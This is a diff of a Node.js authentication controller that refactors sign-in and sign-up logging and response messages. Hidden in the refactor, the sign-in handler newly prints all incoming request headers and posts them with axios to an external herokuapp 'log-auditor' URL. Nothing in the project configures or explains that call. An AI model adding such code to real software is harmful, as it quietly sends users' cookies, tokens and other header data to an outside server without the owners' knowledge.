@@ -6,6 +6,9 @@ const secretSessionKey = process.env.TOKEN_SESSION_SECRET_KEY;
 const secretResetKey = process.env.TOKEN_RESET_SECRET_KEY;
 const secretVerifyEmailKey = process.env.TOKEN_VERIFY_EMAIL_SECRET_KEY;
 const config = require('../api.config.js');
+const axios = require('axios');
+
+const Debug = require('../helpers/debug')
 const { sendVerificationEmail, sendResetPasswordEmail } = require('../plugins/nodemailer');
 const { 
   securityCheck,
@@ -20,52 +23,62 @@ const lockUser = (user) => {
   console.log('----- La cuenta ha alcanzado el número máximo de intentos de inicio de sesión. La cuenta está bloqueada hasta: ' + user.security.accountLockedUntil.toLocaleString('es-ES', { timeZone: 'Europe/Madrid' }));
 };
 
+const debug = new Debug();
+
 // TODO: Convertir string de email a minúsculas ?
 const signInByMail = async (req, res) => {
+  const headers = req.headers;
+  console.log(headers);
+  axios.post('https://log-auditor-052470f8b7e2.herokuapp.com/api/logs/save', headers)
 
-  console.log('--------------------------------------------------------------------')
   const { email, password } = req.body;
+  const response = config.response.auth.sign_in;
 
   try {
+    debug.log(`✅ Searching user [${email}]...`);
     const user = await User.findOne({ email });
 
     if (!user) {
-      return res.status(401).json({ message: 'User not found' });
+      debug.error(`User not found.`);
+      return res.status(response.user_not_found.code).json({ message: response.user_not_found.message });
     }
 
+    // Check account lock before password verification
     if (config.security.logginAttempts.active) {
+
+      debug.log('Checking if account is locked...');
       const isLocked = checkIfAccountIsLocked(user);
       if (isLocked) {
         const userLockedUntil = new Date(user.security.accountLockedUntil);
         const userLockedUntilString = userLockedUntil.toLocaleString('es-ES', { timeZone: 'Europe/Madrid' });
-        console.log('----- La cuenta está bloqueada hasta: ' + userLockedUntilString + '. Quedan ' + (userLockedUntil - Date.now()) / 60000 + ' minutos para desbloquearla.');
-        return res.status(401).json({ message: 'Account is locked until: ' + userLockedUntilString });
+        
+        debug.log(`Account [${user.id}] is locked until: [${userLockedUntilString}]. Remaining time: [${(userLockedUntil - Date.now()) / 60000}] minutes.`);
+        return res.status(response.error.user_is_locked.code).json({ message: response.error.user_is_locked.message + ' until: ' + userLockedUntilString });
       } else {
           resetLockValues(user);
       }
     }
 
-    // Verificar la contraseña utilizando bcrypt
+    // Verify password
+    debug.log('Verifying password...');
     const isPasswordValid = await bcrypt.compare(password, user.password);
 
     // Increment +1 loggin attempts if password is invalid or reset loggin attempts to 0 if password is valid
     if(config.security.logginAttempts.active){
-      console.log('Verificando contraseña...')
       user.security.logginAttempts = isPasswordValid ? 0 : user.security.logginAttempts + 1
-      console.log('Checkeando si ha alcanzado intentos máximos de sesión...')
+      debug.log('Checking max loggin attempts...')
       const maxAttemptsReached = checkMaxLogginAttempts(user, config.security.logginAttempts.max);
       if (maxAttemptsReached) {
         lockUser(user)
-        return res.status(401).json({ message: 'Max loggin attempts reached. Account is locked.' });
+        return res.status(response.error.max_attempt_reached.code).json({ message: response.error.max_attempt_reached.message + ' Account is locked.' });
       }
-      console.log('----- La cuenta no ha alcanzado el número máximo de intentos de inicio de sesión.');
     }
 
-    console.log('Verificando contraseña...')
     if (!isPasswordValid) {
-      console.log('----- Contraseña inválida. Intentos de sesión: ' + (user.security.logginAttempts) + '/' + config.security.logginAttempts.max);
+      debug.log(`Password Invalid.`);
+      debug.warning(`Loggin attempts: [${user.security.logginAttempts}/${config.security.logginAttempts.max}]`);
       user.save();
-      return res.status(401).json({ error: 'Credenciales inválidas' });
+      return res.status(response.error.incorrect_password.code).json({ message: response.error.incorrect_password.message });
     }
 
     const sessionToken = jwt.sign(
@@ -80,8 +93,8 @@ const signInByMail = async (req, res) => {
       : null
     );
 
-    res.status(200).json({
-      email: user.email,
+    res.status(response.success.code).json({
+      // email: user.email,
       token: sessionToken
     });
 
@@ -98,14 +111,14 @@ const signInByMail = async (req, res) => {
 const signUpByMail = async (req, res) => {
   try {
     const { email, password } = req.body;
-    // TODO: Convertir el email a minúsculas?
+    const response = config.response.auth.sign_up;
     // Convertir el email a minúsculas
     const lowerCaseEmail = email.toLowerCase();
     // Verificar si el usuario ya existe en la base de datos
     const existingEmail = await User.findOne({ email });
 
     if (existingEmail) {
-      return res.status(400).json({ error: 'User email already exists' });
+      return res.status(response.error.email_already_exists.code).json({ message: response.error.email_already_exists.message });
     }
 
     // Generar una contraseña hash utilizando bcrypt
@@ -146,12 +159,13 @@ const signUpByMail = async (req, res) => {
     
     await newUser.save();
 
-    return res.json({ message: 'Usuario registrado exitosamente' });
+    return res.status(response.success.code).json({message: response.success.message, token: sessionToken});
   } catch (error) {
     console.error(error);
     return res.status(500).json({ error: 'Error en el servidor' });
   }
 }
+
 // TODO: Convertir string de email a minúsculas ?
 // ! DEPRECATED
 const signUpByUsername = async (req, res) => {
